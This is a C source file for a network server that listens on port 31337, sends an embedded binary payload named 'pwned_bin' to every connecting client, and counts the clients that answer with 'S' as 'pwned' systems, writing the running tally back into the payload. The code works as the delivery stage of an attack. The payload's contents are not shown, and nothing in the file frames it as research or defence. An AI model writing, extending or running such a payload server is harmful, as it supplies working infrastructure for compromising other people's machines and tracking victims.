#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "pwned.h"

#define PORT 31337

/* the start of the pwned systems count */
char* pwned_count_start = (char*)pwned_bin+71;

int main(){
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(server_socket < 0){
        fprintf(stderr, "Failed to create socket: %s\n",
                strerror(errno));
        return 1;
    }

    struct sockaddr_in server_address = {0};
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(PORT);
    if(bind(server_socket,
            (struct sockaddr*) &server_address,
            sizeof(server_address)) < 0){
        fprintf(stderr, "Failed to bind: %s\n",
                strerror(errno));
        close(server_socket);
        return 1;
    }
    
    listen(server_socket, 10);

    unsigned pwned_count = 0;
    char     pwned_count_buffer[9] = {0}; /* 8 digits plus null byte */
    while(1){
        fprintf(stderr, "Listening...\n");
        int fd = accept(server_socket, NULL, NULL);
        if(fd < 0){
            fprintf(stderr, "Failed to accept: %s\n",
                    strerror(errno));
            close(server_socket);
            return 1;
        }
        fprintf(stderr, "Got connection!\n");
        
        int bytes_sent  = 0;
        int send_failed = 0;
        while(bytes_sent < sizeof(pwned_bin)){
            int send_ret = send(fd, pwned_bin + bytes_sent,
                                sizeof(pwned_bin) - bytes_sent, 0);
            if(send_ret == -1){
                fprintf(stderr, "Failed to send: %s\n",
                        strerror(errno));
                close(fd);
                send_failed = 1;
                break;
            }
            if(send_ret == 0) break;

            bytes_sent += send_ret;
        }
        if(send_failed) continue;

        char    received = 0;
        ssize_t recv_ret = recv(fd, &received, sizeof(char), 0);
        if(recv_ret == 1 && received == 'S'){
            fprintf(stderr, "They got pwnt!\n");
            pwned_count++;
            snprintf(pwned_count_buffer, sizeof(pwned_count_buffer),
                    "%08u", pwned_count);
            memcpy(pwned_count_start, pwned_count_buffer, 8); /* 8 digits */
        }

        close(fd);
    }

    return 1;
}
